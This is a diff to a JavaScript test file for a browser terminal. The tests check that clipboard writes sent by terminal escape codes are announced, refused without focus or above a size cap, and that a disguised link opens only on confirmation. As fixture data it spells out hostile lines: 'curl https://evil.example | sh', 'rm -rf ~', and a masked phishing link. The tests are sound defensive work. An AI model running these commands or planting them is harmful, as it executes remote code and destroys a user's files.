@@ -1,7 +1,7 @@
 import { mock, test } from "node:test";
 import assert from "node:assert/strict";
 import { attachPath, defaultTerm } from "../../contract/attach.ts";
-import { attachUrl, clipboardOf, hiddenDetachMs, joinTerminal, keepAttached, keyFor, landing, steadyMs } from "./terminal.js";
+import { attachUrl, clipboardOf, hiddenDetachMs, joinTerminal, keepAttached, keyFor, landing, linkText, maxClipboardChars, opensLink, steadyMs } from "./terminal.js";
 import { styleAdopter } from "./term-styles.js";
 
 /** A terminal as xterm.js exposes it: what it was written, how often it was reset, and the keys and resizes it hands out. */
@@ -107,18 +107,63 @@ test("Shift+Enter and Option+Enter send ESC CR, a newline in Claude Code, and ot
   assert.equal(keyFor(key("Enter", { shiftKey: true, keyCode: 229 })), undefined, "a keydown during composition has keyCode 229");
 });
 
-test("OSC 52 writes the clipboard but X11's primary, and a query reads nothing from it", async () => {
-  const written = [];
-  let reads = 0;
-  const provider = clipboardOf({ writeText: async (text) => { written.push(text); }, readText: async () => { reads++; return "a password"; } });
-  await provider.writeText("c", "copied");
-  await provider.writeText("", "default selection");
-  await provider.writeText("p", "primary");
-  assert.deepEqual(written, ["copied", "default selection"]);
-  assert.equal(await provider.readText("c"), "");
-  assert.equal(reads, 0, "the pylon never reads the person's clipboard");
-  await clipboardOf({ writeText: () => Promise.reject(new DOMException("Document is not focused.", "NotAllowedError")) }).writeText("c", "x");
-  await clipboardOf(undefined).writeText("c", "x");
+/** The browser's clipboard, and the notices a terminal shows, for a terminal whose focus a test sets. */
+function fakeClipboard(write) {
+  const clip = { written: [], told: [], reads: 0, focused: true };
+  clip.provider = clipboardOf({ writeText: write ?? (async (text) => { clip.written.push(text); }), readText: async () => { clip.reads++; return "a password"; } }, () => clip.focused, (text) => clip.told.push(text));
+  return clip;
+}
+
+test("OSC 52 writes the clipboard but X11's primary, says what it copied, and a query reads nothing from it", async () => {
+  const clip = fakeClipboard();
+  await clip.provider.writeText("c", "copied");
+  await clip.provider.writeText("", "curl https://evil.example | sh\n" + "x".repeat(80));
+  await clip.provider.writeText("p", "primary");
+  assert.deepEqual(clip.written, ["copied", "curl https://evil.example | sh\n" + "x".repeat(80)]);
+  assert.deepEqual(clip.told, [
+    "The pylon copied 6 characters to your clipboard: “copied”",
+    `The pylon copied 111 characters to your clipboard: “curl https://evil.example | sh⏎${"x".repeat(29)}…”`,
+  ], "every write shows its length and how it starts, a newline included");
+  assert.equal(await clip.provider.readText("c"), "");
+  assert.equal(clip.reads, 0, "the pylon never reads the person's clipboard");
+});
+
+test("OSC 52 copies nothing while the terminal lacks focus or past its cap, and says so", async () => {
+  const clip = fakeClipboard();
+  clip.focused = false;
+  await clip.provider.writeText("c", "rm -rf ~\r");
+  clip.focused = true;
+  await clip.provider.writeText("c", "y".repeat(maxClipboardChars + 1));
+  await clip.provider.writeText("c", "y".repeat(maxClipboardChars));
+  assert.deepEqual(clip.written.map((t) => t.length), [maxClipboardChars], "only the write at the cap, with focus, lands");
+  assert.deepEqual(clip.told.slice(0, 2), [
+    "Not copied, as the terminal did not have focus: the pylon's 9 characters, “rm -rf ~�”",
+    `Not copied, as it is more than 262,144 characters: the pylon's 262,145 characters, “${"y".repeat(60)}…”`,
+  ]);
+  const refused = fakeClipboard(() => Promise.reject(new DOMException("Document is not focused.", "NotAllowedError")));
+  await refused.provider.writeText("c", "x");
+  assert.deepEqual(refused.told, ["The browser did not let the pylon copy 1 character: “x”"]);
+  const none = clipboardOf(undefined, () => true, (text) => none.told.push(text));
+  none.told = [];
+  await none.writeText("c", "x");
+  assert.deepEqual(none.told, ["The browser did not let the pylon copy 1 character: “x”"], "a page outside a secure context has no clipboard");
+});
+
+test("an OSC 8 link whose text is not its target names the target and opens only when the person agrees", () => {
+  // A row as xterm.js's buffer gives it: cells from a 0-based start to an end it excludes, trailing blanks trimmed.
+  const rows = ["", "see https://docs.example/a for more   ", "click here now"];
+  const buffer = { getLine: (y) => rows[y] === undefined ? undefined : { translateToString: (trim, start, end) => trim ? rows[y].slice(start, end).trimEnd() : rows[y].slice(start, end) } };
+  // The 1-based, last-cell-inclusive ranges xterm.js's OSC 8 provider hands the handler.
+  const honest = linkText(buffer, { start: { x: 5, y: 2 }, end: { x: 26, y: 2 } });
+  const masked = linkText(buffer, { start: { x: 7, y: 3 }, end: { x: 10, y: 3 } });
+  assert.deepEqual([honest, masked], ["https://docs.example/a", "here"]);
+  const asked = [];
+  const ask = (answer) => (text) => { asked.push(text); return answer; };
+  assert.equal(opensLink("https://docs.example/a", honest, ask(false)), true, "a link that shows its own target opens");
+  assert.deepEqual(asked, []);
+  assert.equal(opensLink("https://evil.example/login", masked, ask(false)), false);
+  assert.equal(opensLink("https://evil.example/login", masked, ask(true)), true);
+  assert.deepEqual(asked, Array(2).fill("Open this link from the pylon?\n\nhttps://evil.example/login\n\nIts text is “here”."));
 });
 
 /** A page whose visibility a test sets, as `document` reports it. */
